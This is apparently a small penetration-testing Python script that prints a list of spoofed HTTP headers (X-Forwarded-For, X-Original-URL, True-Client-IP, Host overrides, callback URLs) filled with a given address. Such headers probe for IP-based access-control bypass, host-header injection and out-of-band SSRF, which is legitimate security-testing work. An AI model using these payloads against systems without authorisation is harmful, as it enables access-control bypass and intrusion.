#!/usr/bin/env python3
import argparse


def generate_headers(addr: str, mode: str) -> str:
	headers = {
		"all": [
			f"X-Forwarded: for={addr}; by={addr}; host={addr}",
			f"X-Forwarded-For: {addr}",
			f"X-Forwarded-Host: {addr}",
			f"X-Forwarded-Server: {addr}",
			f"X-Forwarded-IP: {addr}",
			f"X-Remote-IP: {addr}",
			f"X-Remote-Addr: {addr}",
			f"True-Client-IP: {addr}",
			f"X-Real-IP: {addr}",
			f"Client-IP: {addr}",
			f"X-Client-IP: {addr}",
			f"X-InternalIP: {addr}",
			f"X-Originating-IP: {addr}",
			f"X-Originated-IP: {addr}",
			f"CF-Connecting_IP: {addr}",
			f"X-Backend: {addr}",
			f"X-Backend-Name: {addr}",
			f"X-Backend-Host: {addr}",
			f"X-Backend-Addr: {addr}",
			f"X-Backend-IP: {addr}",
			f"X-Backend-Server: {addr}",
			f"X-Host: {addr}",
			f"Proxy-Host: {addr}",
			f"Destination: {addr}",
			f"Via: 1.1 {addr}",
			f"Origin: {addr}",
			f"From: root@{addr}",
			f"Contact: root@{addr}",
			f"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 ua@{addr}",
			f"Proxy: http://{addr}/prx",
			f"X-HTTP-DestinationURL: http://{addr}/dst",
			f"X-Arbitrary: http://{addr}/arb",
			f"Profile: http://{addr}/pro",
			f"X-Wap-Profile: http://{addr}/xwap",
			f"X-Forwarded-Proto: http://{addr}/xfo",
			f"X-Original-URL: http://{addr}/xou",
			f"Referer: http://{addr}/rfr",
			f"Host: {addr}:80@{addr}",
		]
	}

	try:
		return "\n".join(headers[mode])
	except KeyError:
		raise KeyError(f"Type {mode} not found!")
	except:
		raise Exception("NOOO!")

def save_to_file(filename, data):
	try:
		with open(filename, "a") as output:
			output.write(data)
			output.close()
	except:
		raise Exception()


def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-a", "--address", help="Destination domain or IP address",
		dest="address", required=True, type=str)
	parser.add_argument("-m", "--mode", help="Select headers type (all|http|test)",
		dest="mode", required=False, default="all", type=str)
	parser.add_argument("-o", "--output", help="Output filename",
		dest="output", required=False, type=str)
	args = parser.parse_args()
 
	data = generate_headers(args.address, args.mode)
	if(args.output):
		save_to_file(args.output, data)
	else:
		print(data)


if __name__ == "__main__":
	main()
